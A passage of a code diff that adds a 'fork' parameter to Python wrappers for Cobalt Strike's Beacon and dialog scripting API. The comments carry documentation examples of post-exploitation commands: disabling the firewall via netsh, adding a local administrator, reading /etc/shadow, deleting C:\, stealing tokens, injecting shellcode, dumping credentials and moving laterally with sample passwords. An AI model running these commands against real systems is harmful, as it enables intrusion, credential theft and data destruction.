+    return engine.call('bportscan', args, silent=silent, fork=fork)
 
 # 
 # Spawn a process, inject Unmanaged PowerShell, and run the specified command.
@@ -1461,8 +1461,8 @@ def bportscan(*args, silent=False):
 # 	bpowerpick($1, '$PSVersionTable.PSVersion');
 # }
 # 
-def bpowerpick(*args, silent=False):
-    return engine.call('bpowerpick', args, silent=silent)
+def bpowerpick(*args, silent=False, fork=False):
+    return engine.call('bpowerpick', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a PowerShell cmdlet
@@ -1476,8 +1476,8 @@ def bpowerpick(*args, silent=False):
 # 	bpowershell($1, '$PSVersionTable.PSVersion');
 # }
 # 
-def bpowershell(*args, silent=False):
-    return engine.call('bpowershell', args, silent=silent)
+def bpowershell(*args, silent=False, fork=False):
+    return engine.call('bpowershell', args, silent=silent, fork=fork)
 
 # 
 # Import a PowerShell script into a Beacon
@@ -1492,8 +1492,8 @@ def bpowershell(*args, silent=False):
 # 	bpowershell($1, "Invoke-AllChecks");
 # }
 # 
-def bpowershell_import(*args, silent=False):
-    return engine.call('bpowershell_import', args, silent=silent)
+def bpowershell_import(*args, silent=False, fork=False):
+    return engine.call('bpowershell_import', args, silent=silent, fork=fork)
 
 # 
 # Set a parent process for Beacon's child processes
@@ -1525,8 +1525,8 @@ def bpowershell_import(*args, silent=False):
 # 	});
 # }
 # 
-def bppid(*args, silent=False):
-    return engine.call('bppid', args, silent=silent)
+def bppid(*args, silent=False, fork=False):
+    return engine.call('bppid', args, silent=silent, fork=fork)
 
 # 
 # Task a Beacon to list processes
@@ -1548,8 +1548,8 @@ def bppid(*args, silent=False):
 # 	bps($1);
 # }
 # 
-def bps(*args, silent=False):
-    return engine.call('bps', args, silent=silent)
+def bps(*args, silent=False, fork=False):
+    return engine.call('bps', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it. Clean up is included too.
@@ -1564,8 +1564,8 @@ def bps(*args, silent=False):
 # bloginuser($1, "CORP", "Administrator", "toor");
 # bpsexec($1, "172.16.48.3", "my listener", "ADMIN\$");
 # 
-def bpsexec(*args, silent=False):
-    return engine.call('bpsexec', args, silent=silent)
+def bpsexec(*args, silent=False, fork=False):
+    return engine.call('bpsexec', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.
@@ -1582,8 +1582,8 @@ def bpsexec(*args, silent=False):
 # 	bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
 # }
 # 
-def bpsexec_command(*args, silent=False):
-    return engine.call('bpsexec_command', args, silent=silent)
+def bpsexec_command(*args, silent=False, fork=False):
+    return engine.call('bpsexec_command', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a payload on a remote host. This function creates a service to run a PowerShell one-liner.
@@ -1597,8 +1597,8 @@ def bpsexec_command(*args, silent=False):
 # bloginuser($1, "CORP", "Administrator", "toor");
 # bpsexec_psh($1, "172.16.48.3", "my listener");
 # 
-def bpsexec_psh(*args, silent=False):
-    return engine.call('bpsexec_psh', args, silent=silent)
+def bpsexec_psh(*args, silent=False, fork=False):
+    return engine.call('bpsexec_psh', args, silent=silent, fork=fork)
 
 # 
 # Inject Unmanaged PowerShell into a specific process and run the specified cmdlet
@@ -1611,8 +1611,8 @@ def bpsexec_psh(*args, silent=False):
 # 
 # bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
 # 
-def bpsinject(*args, silent=False):
-    return engine.call('bpsinject', args, silent=silent)
+def bpsinject(*args, silent=False, fork=False):
+    return engine.call('bpsinject', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to print its current working directory
@@ -1624,8 +1624,8 @@ def bpsinject(*args, silent=False):
 # 	bpwd($1);
 # }
 # 
-def bpwd(*args, silent=False):
-    return engine.call('bpwd', args, silent=silent)
+def bpwd(*args, silent=False, fork=False):
+    return engine.call('bpwd', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to query a key within the registry.
@@ -1639,8 +1639,8 @@ def bpwd(*args, silent=False):
 # 	breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
 # }
 # 
-def breg_query(*args, silent=False):
-    return engine.call('breg_query', args, silent=silent)
+def breg_query(*args, silent=False, fork=False):
+    return engine.call('breg_query', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to query a value within a registry key.
@@ -1655,8 +1655,8 @@ def breg_query(*args, silent=False):
 # 	breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
 # }
 # 
-def breg_queryv(*args, silent=False):
-    return engine.call('breg_queryv', args, silent=silent)
+def breg_queryv(*args, silent=False, fork=False):
+    return engine.call('breg_queryv', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.
@@ -1668,8 +1668,8 @@ def breg_queryv(*args, silent=False):
 # 	brev2self($1);
 # }
 # 
-def brev2self(*args, silent=False):
-    return engine.call('brev2self', args, silent=silent)
+def brev2self(*args, silent=False, fork=False):
+    return engine.call('brev2self', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to remove a file or folder.
@@ -1681,8 +1681,8 @@ def brev2self(*args, silent=False):
 # # nuke the system
 # brm($1, "c:\\");
 # 
-def brm(*args, silent=False):
-    return engine.call('brm', args, silent=silent)
+def brm(*args, silent=False, fork=False):
+    return engine.call('brm', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to setup a reverse port forward.
@@ -1695,8 +1695,8 @@ def brm(*args, silent=False):
 # 
 # brportfwd($1, 80, "192.168.12.88", 80);
 # 
-def brportfwd(*args, silent=False):
-    return engine.call('brportfwd', args, silent=silent)
+def brportfwd(*args, silent=False, fork=False):
+    return engine.call('brportfwd', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to stop a reverse port forward
@@ -1707,8 +1707,8 @@ def brportfwd(*args, silent=False):
 # 
 # brportfwd_stop($1, 80);
 # 
-def brportfwd_stop(*args, silent=False):
-    return engine.call('brportfwd_stop', args, silent=silent)
+def brportfwd_stop(*args, silent=False, fork=False):
+    return engine.call('brportfwd_stop', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a command as another user.
@@ -1722,8 +1722,8 @@ def brportfwd_stop(*args, silent=False):
 # 
 # brunas($1, "CORP", "Administrator", "toor", "notepad.exe");
 # 
-def brunas(*args, silent=False):
-    return engine.call('brunas', args, silent=silent)
+def brunas(*args, silent=False, fork=False):
+    return engine.call('brunas', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a command in a high-integrity context (bypasses UAC).
@@ -1741,8 +1741,8 @@ def brunas(*args, silent=False):
 # # disable the firewall
 # brunasadmin($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
 # 
-def brunasadmin(*args, silent=False):
-    return engine.call('brunasadmin', args, silent=silent)
+def brunasadmin(*args, silent=False, fork=False):
+    return engine.call('brunasadmin', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a process under another process.
@@ -1754,8 +1754,8 @@ def brunasadmin(*args, silent=False):
 # 
 # brunu($1, 1234, "notepad.exe");
 # 
-def brunu(*args, silent=False):
-    return engine.call('brunu', args, silent=silent)
+def brunu(*args, silent=False, fork=False):
+    return engine.call('brunu', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to take a screenshot
@@ -1769,8 +1769,8 @@ def brunu(*args, silent=False):
 # 	bscreenshot($1, 0);
 # }
 # 
-def bscreenshot(*args, silent=False):
-    return engine.call('bscreenshot', args, silent=silent)
+def bscreenshot(*args, silent=False, fork=False):
+    return engine.call('bscreenshot', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to set an environment variable
@@ -1785,8 +1785,8 @@ def bscreenshot(*args, silent=False):
 # 	bshell($1, "echo %foo%");
 # }
 # 
-def bsetenv(*args, silent=False):
-    return engine.call('bsetenv', args, silent=silent)
+def bsetenv(*args, silent=False, fork=False):
+    return engine.call('bsetenv', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a command with cmd.exe
@@ -1800,8 +1800,8 @@ def bsetenv(*args, silent=False):
 # 	bshell($1, "net localgroup \"Administrators\" $2 /ADD");
 # }
 # 
-def bshell(*args, silent=False):
-    return engine.call('bshell', args, silent=silent)
+def bshell(*args, silent=False, fork=False):
+    return engine.call('bshell', args, silent=silent, fork=fork)
 
 # 
 # Inject shellcode (from a local file) into a specific process
@@ -1814,8 +1814,8 @@ def bshell(*args, silent=False):
 # 
 # bshinject($1, 1234, "x86", "/path/to/stuff.bin");
 # 
-def bshinject(*args, silent=False):
-    return engine.call('bshinject', args, silent=silent)
+def bshinject(*args, silent=False, fork=False):
+    return engine.call('bshinject', args, silent=silent, fork=fork)
 
 # 
 # Spawn shellcode (from a local file) into another process. This function benefits from Beacon's configuration to spawn post-exploitation jobs (e.g., spawnto, ppid, etc.)
@@ -1827,8 +1827,8 @@ def bshinject(*args, silent=False):
 # 
 # bshspawn($1, "x86", "/path/to/stuff.bin");
 # 
-def bshspawn(*args, silent=False):
-    return engine.call('bshspawn', args, silent=silent)
+def bshspawn(*args, silent=False, fork=False):
+    return engine.call('bshspawn', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to change its beaconing interval and jitter factor.
@@ -1843,8 +1843,8 @@ def bshspawn(*args, silent=False):
 # 	bsleep($1, 60 * 60, 30);
 # }
 # 
-def bsleep(*args, silent=False):
-    return engine.call('bsleep', args, silent=silent)
+def bsleep(*args, silent=False, fork=False):
+    return engine.call('bsleep', args, silent=silent, fork=fork)
 
 # 
 # Start a SOCKS proxy server associated with a beacon.
@@ -1857,8 +1857,8 @@ def bsleep(*args, silent=False):
 # 	bsocks($1, 1234);
 # }
 # 
-def bsocks(*args, silent=False):
-    return engine.call('bsocks', args, silent=silent)
+def bsocks(*args, silent=False, fork=False):
+    return engine.call('bsocks', args, silent=silent, fork=fork)
 
 # 
 # Stop SOCKS proxy servers associated with the specified Beacon.
@@ -1870,8 +1870,8 @@ def bsocks(*args, silent=False):
 # 	bsocks_stop($1);
 # }
 # 
-def bsocks_stop(*args, silent=False):
-    return engine.call('bsocks_stop', args, silent=silent)
+def bsocks_stop(*args, silent=False, fork=False):
+    return engine.call('bsocks_stop', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a new session
@@ -1888,8 +1888,8 @@ def bsocks_stop(*args, silent=False):
 # 	}, $bids => $1));
 # }
 # 
-def bspawn(*args, silent=False):
-    return engine.call('bspawn', args, silent=silent)
+def bspawn(*args, silent=False, fork=False):
+    return engine.call('bspawn', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a session as another user.
@@ -1903,8 +1903,8 @@ def bspawn(*args, silent=False):
 # 
 # bspawnas($1, "CORP", "Administrator", "toor", "my listener");
 # 
-def bspawnas(*args, silent=False):
-    return engine.call('bspawnas', args, silent=silent)
+def bspawnas(*args, silent=False, fork=False):
+    return engine.call('bspawnas', args, silent=silent, fork=fork)
 
 # 
 # Change the default program Beacon spawns to inject capabilities into.
@@ -1926,8 +1926,8 @@ def bspawnas(*args, silent=False):
 # 	bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
 # }
 # 
-def bspawnto(*args, silent=False):
-    return engine.call('bspawnto', args, silent=silent)
+def bspawnto(*args, silent=False, fork=False):
+    return engine.call('bspawnto', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a session under another process. This builds on &brunu and uses powershell.exe.
@@ -1939,8 +1939,8 @@ def bspawnto(*args, silent=False):
 # 
 # bspawnu($1, 1234, "my listener");
 # 
-def bspawnu(*args, silent=False):
-    return engine.call('bspawnu', args, silent=silent)
+def bspawnu(*args, silent=False, fork=False):
+    return engine.call('bspawnu', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn an SSH session.
@@ -1954,8 +1954,8 @@ def bspawnu(*args, silent=False):
 # 
 # bssh($1, "172.16.20.128", 22, "root", "toor");
 # 
-def bssh(*args, silent=False):
-    return engine.call('bssh', args, silent=silent)
+def bssh(*args, silent=False, fork=False):
+    return engine.call('bssh', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn an SSH session.
@@ -1973,8 +1973,8 @@ def bssh(*args, silent=False):
 # 
 # bssh_key($1, "172.16.20.128", 22, "root", $keydata);
 # 
-def bssh_key(*args, silent=False):
-    return engine.call('bssh_key', args, silent=silent)
+def bssh_key(*args, silent=False, fork=False):
+    return engine.call('bssh_key', args, silent=silent, fork=fork)
 
 # 
 # This function handles the staging process for a bind listener. If the specified listener is not a bind listener, this function does nothing. Otherwise, it completes the staging protocol over a named pipe or a local socket.
@@ -1990,8 +1990,8 @@ def bssh_key(*args, silent=False):
 # 	bstage($1, $2, $3, "x86");
 # }
 # 
-def bstage(*args, silent=False):
-    return engine.call('bstage', args, silent=silent)
+def bstage(*args, silent=False, fork=False):
+    return engine.call('bstage', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to steal a token from a process.
@@ -2004,8 +2004,8 @@ def bstage(*args, silent=False):
 # 	bsteal_token($1, int($2));
 # }
 # 
-def bsteal_token(*args, silent=False):
-    return engine.call('bsteal_token', args, silent=silent)
+def bsteal_token(*args, silent=False, fork=False):
+    return engine.call('bsteal_token', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to run a command via sudo (SSH sessions only)
@@ -2020,8 +2020,8 @@ def bsteal_token(*args, silent=False):
 # 	bsudo($1, $2, "cat /etc/shadow");
 # }
 # 
-def bsudo(*args, silent=False):
-    return engine.call('bsudo', args, silent=silent)
+def bsudo(*args, silent=False, fork=False):
+    return engine.call('bsudo', args, silent=silent, fork=fork)
 
 # 
 # Report a task acknowledgement for a Beacon. This task acknowledgement will also contribute to the narrative in Cobalt Strike's Activity Report and Sessions Report.
@@ -2036,8 +2036,8 @@ def bsudo(*args, silent=False):
 # 	btask($1, "User tasked beacon to foo", "T1015");
 # }
 # 
-def btask(*args, silent=False):
-    return engine.call('btask', args, silent=silent)
+def btask(*args, silent=False, fork=False):
+    return engine.call('btask', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to change the file modified/accessed/created times to match another file.
@@ -2055,8 +2055,8 @@ def btask(*args, silent=False):
 # 	bshell($1, 'sc start netsrv');
 # }
 # 
-def btimestomp(*args, silent=False):
-    return engine.call('btimestomp', args, silent=silent)
+def btimestomp(*args, silent=False, fork=False):
+    return engine.call('btimestomp', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to delink a Beacon its connected to over a named pipe.
@@ -2067,8 +2067,8 @@ def btimestomp(*args, silent=False):
 # 
 # bunlink($1, "172.16.48.3");
 # 
-def bunlink(*args, silent=False):
-    return engine.call('bunlink', args, silent=silent)
+def bunlink(*args, silent=False, fork=False):
+    return engine.call('bunlink', args, silent=silent, fork=fork)
 
 # 
 # Ask a Beacon to upload a file
@@ -2079,8 +2079,8 @@ def bunlink(*args, silent=False):
 # 
 # bupload($1, script_resource("evil.exe"));
 # 
-def bupload(*args, silent=False):
-    return engine.call('bupload', args, silent=silent)
+def bupload(*args, silent=False, fork=False):
+    return engine.call('bupload', args, silent=silent, fork=fork)
 
 # 
 # Ask a Beacon to upload a file
@@ -2094,8 +2094,8 @@ def bupload(*args, silent=False):
 # $data = artifact("my listener", "exe");
 # bupload_raw($1, "\\\\DC\\C$\\foo.exe", $data);
 # 
-def bupload_raw(*args, silent=False):
-    return engine.call('bupload_raw', args, silent=silent)
+def bupload_raw(*args, silent=False, fork=False):
+    return engine.call('bupload_raw', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to dump in-memory credentials with mimikatz [with the wdigest command]. The &blogonpasswords option is superior to this command.
@@ -2110,8 +2110,8 @@ def bupload_raw(*args, silent=False):
 # 
 # 
 # 
-def bwdigest(*args, silent=False):
-    return engine.call('bwdigest', args, silent=silent)
+def bwdigest(*args, silent=False, fork=False):
+    return engine.call('bwdigest', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a payload on a remote host. This function uses WinRM to run a PowerShell one-liner
@@ -2125,8 +2125,8 @@ def bwdigest(*args, silent=False):
 # bloginuser($1, "CORP", "Administrator", "toor");
 # bwinrm($1, "172.16.48.3", "my listener");
 # 
-def bwinrm(*args, silent=False):
-    return engine.call('bwinrm', args, silent=silent)
+def bwinrm(*args, silent=False, fork=False):
+    return engine.call('bwinrm', args, silent=silent, fork=fork)
 
 # 
 # Ask Beacon to spawn a payload on a remote host. This function uses WMI to run a PowerShell one-liner
@@ -2140,8 +2140,8 @@ def bwinrm(*args, silent=False):
 # bloginuser($1, "CORP", "Administrator", "toor");
 # bwmi($1, "172.16.48.3", "my listener");
 # 
-def bwmi(*args, silent=False):
-    return engine.call('bwmi', args, silent=silent)
+def bwmi(*args, silent=False, fork=False):
+    return engine.call('bwmi', args, silent=silent, fork=fork)
 
 # 
 # Issue a call to the team server.
@@ -2153,8 +2153,8 @@ def bwmi(*args, silent=False):
 # 
 # call("aggressor.ping", { warn(@_); }, "this is my value");
 # 
-def call(*args):
-    return engine.call('call', args)
+def call(*args, fork=False):
+    return engine.call('call', args, fork=fork)
 
 # 
 # Close the current Cobalt Strike team server connection.
@@ -2162,8 +2162,8 @@ def call(*args):
 # 
 # closeClient();
 # 
-def closeClient(*args):
-    return engine.call('closeClient', args)
+def closeClient(*args, fork=False):
+    return engine.call('closeClient', args, fork=fork)
 
 # 
 # Add a credential to the data model
@@ -2181,8 +2181,8 @@ def closeClient(*args):
 # 	}
 # }
 # 
-def credential_add(*args):
-    return engine.call('credential_add', args)
+def credential_add(*args, fork=False):
+    return engine.call('credential_add', args, fork=fork)
 
 # 
 # Returns a list of application credentials in Cobalt Strike's data model.
@@ -2192,8 +2192,8 @@ def credential_add(*args):
 # 
 # printAll(credentials());
 # 
-def credentials(*args):
-    return engine.call('credentials', args)
+def credentials(*args, fork=False):
+    return engine.call('credentials', args, fork=fork)
 
 # 
 # List the query-able keys from Cobalt Strike's data model
@@ -2206,8 +2206,8 @@ def credentials(*args):
 # 	println(data_query($key));
 # }
 # 
-def data_keys(*args):
-    return engine.call('data_keys', args)
+def data_keys(*args, fork=False):
+    return engine.call('data_keys', args, fork=fork)
 
 # 
 # Queries Cobalt Strike's data model
@@ -2219,8 +2219,8 @@ def data_keys(*args):
 # 
 # println(data_query("targets"));
 # 
-def data_query(*args):
-    return engine.call('data_query', args)
+def data_query(*args, fork=False):
+    return engine.call('data_query', args, fork=fork)
 
 # 
 # Adds an action button to a &dialog. When this button is pressed, the dialog closes and its callback is called. You may add multiple buttons to a dialog. Cobalt Strike will line these buttons up in a row and center them at the bottom of the dialog.
@@ -2232,8 +2232,8 @@ def data_query(*args):
 # dbutton_action($dialog, "Start");
 # dbutton_action($dialog, "Stop");
 # 
-def dbutton_action(*args):
-    return engine.call('dbutton_action', args)
+def dbutton_action(*args, fork=False):
+    return engine.call('dbutton_action', args, fork=fork)
 
 # 
 # Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.
@@ -2244,8 +2244,8 @@ def dbutton_action(*args):
 # 
 # dbutton_help($dialog, "http://www.google.com");
 # 
-def dbutton_help(*args):
-    return engine.call('dbutton_help', args)
+def dbutton_help(*args, fork=False):
+    return engine.call('dbutton_help', args, fork=fork)
 
 # 
 # Create a dialog. Use &dialog_show to show it.
@@ -2268,8 +2268,8 @@ def dbutton_help(*args):
 # dbutton_action($dialog, "Go");
 # dialog_show($dialog);
 # 
-def dialog(*args):
-    return engine.call('dialog', args)
+def dialog(*args, fork=False):
+    return engine.call('dialog', args, fork=fork)
 
 # 
 # Adds a description to a &dialog
@@ -2280,8 +2280,8 @@ def dialog(*args):
 # 
 # dialog_description($dialog, "I am the Hello World dialog.");
 # 
-def dialog_description(*args):
-    return engine.call('dialog_description', args)
+def dialog_description(*args, fork=False):
+    return engine.call('dialog_description', args, fork=fork)
 
 # 
 # Shows a &dialog.
@@ -2291,8 +2291,8 @@ def dialog_description(*args):
 # 
 # dialog_show($dialog);
 # 
-def dialog_show(*args):
-    return engine.call('dialog_show', args)
+def dialog_show(*args, fork=False):
+    return engine.call('dialog_show', args, fork=fork)
 
 # 
 # Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.
@@ -2304,8 +2304,8 @@ def dialog_show(*args):
 # 	println("Hello World");
 # });
 # 
-def dispatch_event(*args):
-    return engine.call('dispatch_event', args)
+def dispatch_event(*args, fork=False):
+    return engine.call('dispatch_event', args, fork=fork)
 
 # 
 # Returns a list of downloads in Cobalt Strike's data model.
@@ -2315,8 +2315,8 @@ def dispatch_event(*args):
 # 
 # printAll(downloads());
 # 
-def downloads(*args):
-    return engine.call('downloads', args)
+def downloads(*args, fork=False):
+    return engine.call('downloads', args, fork=fork)
 
 # 
 # Adds a beacon selection row to a &dialog
@@ -2328,8 +2328,8 @@ def downloads(*args):
 # 
 # drow_beacon($dialog, "bid", "Session: ");
 # 
-def drow_beacon(*args):
-    return engine.call('drow_beacon', args)
+def drow_beacon(*args, fork=False):
+    return engine.call('drow_beacon', args, fork=fork)
 
 # 
 # Adds a checkbox to a &dialog
@@ -2342,8 +2342,8 @@ def drow_beacon(*args):
 # 
 # drow_checkbox($dialog, "box", "Scary: ", "Check me... if you dare");
 # 
-def drow_checkbox(*args):
-    return engine.call('drow_checkbox', args)
+def drow_checkbox(*args, fork=False):
+    return engine.call('drow_checkbox', args, fork=fork)
 
 # 
 # Adds a combobox to a &dialog
@@ -2356,8 +2356,8 @@ def drow_checkbox(*args):
 # 
 # drow_combobox($dialog, "combo", "Options", @("apple", "bat", "cat"));
 # 
-def drow_combobox(*args):
-    return engine.call('drow_combobox', args)
+def drow_combobox(*args, fork=False):
+    return engine.call('drow_combobox', args, fork=fork)
 
 # 
 # Adds a privilege escalation exploit selection row to a &dialog
@@ -2369,8 +2369,8 @@ def drow_combobox(*args):
 # 
 # drow_exploits($dialog, "exploit", "Exploit: ");
 # 
-def drow_exploits(*args):
-    return engine.call('drow_exploits', args)
+def drow_exploits(*args, fork=False):
+    return engine.call('drow_exploits', args, fork=fork)
 
 # 
 # Adds a file chooser row to a &dialog
@@ -2382,8 +2382,8 @@ def drow_exploits(*args):
 # 
 # drow_file($dialog, "file", "Choose: ");
 # 
-def drow_file(*args):
-    return engine.call('drow_file', args)
+def drow_file(*args, fork=False):
+    return engine.call('drow_file', args, fork=fork)
 
 # 
 # Adds a VPN interface selection row to a &dialog
@@ -2395,8 +2395,8 @@ def drow_file(*args):
 # 
 # drow_interface($dialog, "int", "Interface: ");
 # 
-def drow_interface(*args):
-    return engine.call('drow_interface', args)
+def drow_interface(*args, fork=False):
+    return engine.call('drow_interface', args, fork=fork)
 
 # 
 # Adds a krbtgt selection row to a &dialog
@@ -2408,8 +2408,8 @@ def drow_interface(*args):
 # 
 # drow_krbtgt($dialog, "hash", "krbtgt hash: ");
 # 
-def drow_krbtgt(*args):
-    return engine.call('drow_krbtgt', args)
+def drow_krbtgt(*args, fork=False):
+    return engine.call('drow_krbtgt', args, fork=fork)
 
 # 
 # Adds a listener selection row to a &dialog. This row does not show SMB listeners.
@@ -2421,8 +2421,8 @@ def drow_krbtgt(*args):
 # 
 # drow_listener($dialog, "listener", "Listener: ");
 # 
-def drow_listener(*args):
-    return engine.call('drow_listener', args)
+def drow_listener(*args, fork=False):
+    return engine.call('drow_listener', args, fork=fork)
 
 # 
 # Adds a listener selection row to a &dialog. This row shows SMB listeners.
@@ -2434,8 +2434,8 @@ def drow_listener(*args):
 # 
 # drow_listener_smb($dialog, "listener", "Listener: ");
 # 
-def drow_listener_smb(*args):
-    return engine.call('drow_listener_smb', args)
+def drow_listener_smb(*args, fork=False):
+    return engine.call('drow_listener_smb', args, fork=fork)
 
 # 
 # Adds a listener selection row to a &dialog. This row shows local Beacon listeners with stages only. Foreign listeners and listeners from other servers are excluded.
@@ -2447,8 +2447,8 @@ def drow_listener_smb(*args):
 # 
 # drow_listener_stage($dialog, "listener", "Stage: ");
 # 
-def drow_listener_stage(*args):
-    return engine.call('drow_listener_stage', args)
+def drow_listener_stage(*args, fork=False):
+    return engine.call('drow_listener_stage', args, fork=fork)
 
 # 
 # Adds a mail server field to a &dialog.
@@ -2460,8 +2460,8 @@ def drow_listener_stage(*args):
 # 
 # drow_mailserver($dialog, "mail", "SMTP Server: ");
 # 
-def drow_mailserver(*args):
-    return engine.call('drow_mailserver', args)
+def drow_mailserver(*args, fork=False):
+    return engine.call('drow_mailserver', args, fork=fork)
 
 # 
 # Adds a proxy server field to a &dialog.
@@ -2473,8 +2473,8 @@ def drow_mailserver(*args):
 # 
 # drow_proxyserver($dialog, "proxy", "Proxy: ");
 # 
-def drow_proxyserver(*args):
-    return engine.call('drow_proxyserver', args)
+def drow_proxyserver(*args, fork=False):
+    return engine.call('drow_proxyserver', args, fork=fork)
 
 # 
 # Adds a site/URL field to a &dialog.
@@ -2486,8 +2486,8 @@ def drow_proxyserver(*args):
 # 
 # drow_site($dialog, "url", "Site: ");
 # 
-def drow_site(*args):
-    return engine.call('drow_site', args)
+def drow_site(*args, fork=False):
+    return engine.call('drow_site', args, fork=fork)
 
 # 
 # Adds a text field row to a &dialog
@@ -2500,8 +2500,8 @@ def drow_site(*args):
 # 
 # drow_text($dialog, "name", "Name: ");
 # 
-def drow_text(*args):
-    return engine.call('drow_text', args)
+def drow_text(*args, fork=False):
+    return engine.call('drow_text', args, fork=fork)
 
 # 
 # Adds a multi-line text field to a &dialog
@@ -2513,8 +2513,8 @@ def drow_text(*args):
 # 
 # drow_text_big($dialog, "addr", "Address: ");
 # 
-def drow_text_big(*args):
-    return engine.call('drow_text_big', args)
+def drow_text_big(*args, fork=False):
+    return engine.call('drow_text_big', args, fork=fork)
 
 # 
 # Format a time into a date/time value. This value includes seconds.
@@ -2527,8 +2527,8 @@ def drow_text_big(*args):
 # See Also
 # &tstamp
 # 
-def dstamp(*args):
-    return engine.call('dstamp', args)
+def dstamp(*args, fork=False):
+    return engine.call('dstamp', args, fork=fork)
 
 # 
 # Publish a notification to the event log
@@ -2538,8 +2538,8 @@ def dstamp(*args):
 # 
 # elog("The robot invasion has begun!");
 # 
-def elog(*args):
-    return engine.call('elog', args)
+def elog(*args, fork=False):
+    return engine.call('elog', args, fork=fork)
 
 # 
 # Obfuscate a position-independent blob of code with an encoder.
@@ -2574,8 +2574,8 @@ def elog(*args):
 # # encode it.
 # $stager = encode($stager, "xor", "x86");
 # 
-def encode(*args):
-    return engine.call('encode', args)
+def encode(*args, fork=False):
+    return engine.call('encode', args, fork=fork)
 
 # 
 # Runs a user-defined alias
@@ -2590,8 +2590,8 @@ def encode(*args):
 # 	fireAlias($1, "foo", "bar!");
 # }
 # 
-def fireAlias(*args):
-    return engine.call('fireAlias', args)
+def fireAlias(*args, fork=False):
+    return engine.call('fireAlias', args, fork=fork)
 
 # 
 # Fire an event.
@@ -2606,8 +2606,8 @@ def fireAlias(*args):
 # 
 # fireEvent("foo", "Hello World!");
 # 
-def fireEvent(*args):
-    return engine.call('fireEvent', args)
+def fireEvent(*args, fork=False):
+    return engine.call('fireEvent', args, fork=fork)
 
 # 
 # Formats a number into a size (e.g., 1024 => 1kb)
@@ -2620,8 +2620,8 @@ def fireEvent(*args):
 # println(format_size(1024));
 # 
 # 
-def format_size(*args):
-    return engine.call('format_size', args)
+def format_size(*args, fork=False):
+    return engine.call('format_size', args, fork=fork)
 
 # 
 # Decompress a string (GZIP).
@@ -2636,8 +2636,8 @@ def format_size(*args):
 # See Also
 # &gzip
 # 
-def gunzip(*args):
-    return engine.call('gunzip', args)
+def gunzip(*args, fork=False):
+    return engine.call('gunzip', args, fork=fork)
 
 # 
 # GZIP a string.
@@ -2651,8 +2651,8 @@ def gunzip(*args):
 # 
 # See Also
 # &gunzip
-def gzip(*args):
-    return engine.call('gzip', args)
+def gzip(*args, fork=False):
+    return engine.call('gzip', args, fork=fork)
 
 # 
 # Delete a host from the targets model
@@ -2663,8 +2663,8 @@ def gzip(*args):
 # # clear all hosts
 # host_delete(hosts());
 # 
-def host_delete(*args):
-    return engine.call('host_delete', args)
+def host_delete(*args, fork=False):
+    return engine.call('host_delete', args, fork=fork)
 
 # 
 # Get information about a target.
@@ -2690,8 +2690,8 @@ def host_delete(*args):
 # 	}
 # }
 # 
-def host_info(*args):
-    return engine.call('host_info', args)
+def host_info(*args, fork=False):
+    return engine.call('host_info', args, fork=fork)
 
 # 
 # Add or update a host in the targets model
@@ -2707,8 +2707,8 @@ def host_info(*args):
 # 
 # host_update("192.168.20.3", "DC", "Windows", 10.0);
 # 
-def host_update(*args):
-    return engine.call('host_update', args)
+def host_update(*args, fork=False):
+    return engine.call('host_update', args, fork=fork)
 
 # 
 # Returns a list of IP addresses from Cobalt Strike's target model
@@ -2718,8 +2718,8 @@ def host_update(*args):
 # 
 # printAll(hosts());
 # 
-def hosts(*args):
-    return engine.call('hosts', args)
+def hosts(*args, fork=False):
+    return engine.call('hosts', args, fork=fork)
 
 # 
 # Bring menus associated with a popup hook into the current menu tree.
@@ -2736,8 +2736,8 @@ def hosts(*args):
 # 	# menu definitions below this point
 # }
 # 
-def insert_menu(*args):
-    return engine.call('insert_menu', args)
+def insert_menu(*args, fork=False):
+    return engine.call('insert_menu', args, fork=fork)
 
 # 
 # Generate an array of IPv4 addresses based on a string description
@@ -2775,8 +2775,8 @@ def insert_menu(*args):
 # 
 # printAll(iprange("192.168.1.0/25"));
 # 
-def iprange(*args):
-    return engine.call('iprange', args)
+def iprange(*args, fork=False):
